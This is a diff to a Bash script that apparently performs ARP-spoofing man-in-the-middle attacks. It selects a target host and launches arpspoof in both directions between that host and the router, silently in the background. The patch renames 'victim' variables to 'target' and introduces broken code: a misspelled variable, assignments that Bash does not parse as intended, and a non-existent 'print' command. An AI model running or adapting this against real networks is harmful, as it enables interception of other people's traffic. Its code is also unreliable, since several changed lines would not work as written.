@@ -54,10 +54,10 @@ function selectedTarget {
 function trafficSelectedIp {
   targetIPAddress=${ipAddressesMIM[ipSelectedMIM-1]}
   #victimMACAddress=${macAddresses[ipSelectedOption-1]}
-  echo -e " ${YELLOW}Target IP: ${RED}"$victimIPAddress${WHITE}
+  echo -e " ${YELLOW}Target IP: ${RED}"$vtargetIPAddress${WHITE}
   echo -e " ${YELLOW}Router IP: ${RED}"$defaultGateway${WHITE}
 
-  echo " access from "$victimIPAddress"..."
+  echo " access from "$targetIPAddress"..."
   printf "\n\n\n"
   echo -e "${RED}         -> Press CTRL+C to STOP!${WHITE}"
   printf "\n\n"
@@ -65,13 +65,13 @@ function trafficSelectedIp {
 
 function interceptPackages {
   print "Intercepting pacakages\n\n"
-  cmd= ("arpspoof -i wlan0 -t "$victimIPAddress" "$defaultGateway "")
+  cmd= "arpspoof -i wlan0 -t "$targetIPAddress" "$defaultGateway 
 
   eval "${cmd}" &>/dev/null &disown
 }
 
 function inverseInterceptPackages {
-  cmd2= ("arpspoof -i wlan0 -t "$defaultGateway" "$victimIPAddress "")
+  cmd2= "arpspoof -i wlan0 -t "$defaultGateway" "$targetIPAddress
 
   eval "${cmd2}" &>/dev/null &disown
 }
